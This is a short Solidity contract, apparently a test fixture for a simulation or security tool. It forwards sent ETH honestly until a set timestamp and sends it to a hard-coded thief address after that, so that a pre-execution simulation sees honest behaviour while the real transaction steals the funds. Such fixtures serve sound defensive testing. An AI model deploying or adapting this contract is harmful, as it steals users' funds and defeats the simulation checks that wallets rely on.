// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.37;

/// Honest before `armedAt`, a thief from then on. A simulation run just before
/// `armedAt` sees an honest forward, and the real block just after sees theft.
/// For the deferred differential (timestamp-shifted) simulation.
contract TimeBomb {
    uint256 public immutable armedAt;
    address payable public immutable thief;

    constructor(uint256 armedAt_, address payable thief_) {
        armedAt = armedAt_;
        thief = thief_;
    }

    function forward(address payable to) external payable {
        address payable recipient = block.timestamp < armedAt ? to : thief;
        (bool ok,) = recipient.call{value: msg.value}("");
        require(ok, "forward failed");
    }
}
